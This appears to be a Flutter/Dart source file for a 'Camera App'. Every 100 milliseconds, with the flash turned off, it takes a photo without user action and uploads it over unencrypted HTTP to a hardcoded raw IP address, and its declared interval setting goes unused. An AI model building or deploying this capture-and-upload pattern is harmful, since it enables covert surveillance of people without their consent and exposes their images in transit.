import 'dart:ffi';

import 'package:flutter/material.dart';
import 'dart:async';
import 'dart:io';
import 'package:camera/camera.dart';
import 'package:http/http.dart' as http;
import 'package:http_parser/http_parser.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  final cameras = await availableCameras();
  final firstCamera = cameras.first;

  runApp(MyApp(camera: firstCamera));
}

class MyApp extends StatelessWidget {
  final CameraDescription camera;

  const MyApp({Key? key, required this.camera}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Camera App',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: CameraScreen(camera: camera),
    );
  }
}

class CameraScreen extends StatefulWidget {
  final CameraDescription camera;

  const CameraScreen({Key? key, required this.camera}) : super(key: key);

  @override
  _CameraScreenState createState() => _CameraScreenState();
}

class _CameraScreenState extends State<CameraScreen> {
  late CameraController _controller;
  late Future<void> _initializeControllerFuture;
  Timer? _timer;

  // Set the interval time in seconds
  final int intervalSeconds = 1500;

  @override
  void initState() {
    super.initState();
    _controller = CameraController(
      widget.camera,
      ResolutionPreset.high,
    );
    _initializeControllerFuture = _controller.initialize();
    _controller.setFlashMode(FlashMode.off);

    // Start the timer for automatic photo capture
    _timer = Timer.periodic(const Duration(milliseconds: 100), (timer) {
      _takePictureAndSend();
    });
  }

  @override
  void dispose() {
    _controller.dispose();
    _timer?.cancel();
    super.dispose();
  }

  Future<void> _takePictureAndSend() async {
    try {
      await _initializeControllerFuture;

      // Take the picture and get the file path
      final image = await _controller.takePicture();

      // Send the image to the server
      await _sendImageToApi(image.path);
    } catch (e) {
      print("Error taking picture: $e");
    }
  }

  Future<void> _sendImageToApi(String imagePath) async {
    final uri = Uri.parse("http://98.11.205.187:6699/upload");
    final request = http.MultipartRequest("POST", uri);
    request.files.add(await http.MultipartFile.fromPath(
      'image',
      imagePath,
      contentType: MediaType('image', 'jpeg'),
    ));

    try {
      final response = await request.send();
      if (response.statusCode == 200) {
        print("Image uploaded successfully");
      } else {
        print("Failed to upload image: ${response.statusCode}");
      }
    } catch (e) {
      print("Error uploading image: $e");
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text('Camera App')),
      body: FutureBuilder<void>(
        future: _initializeControllerFuture,
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.done) {
            return CameraPreview(_controller);
          } else {
            return const Center(child: CircularProgressIndicator());
          }
        },
      ),
    );
  }
}
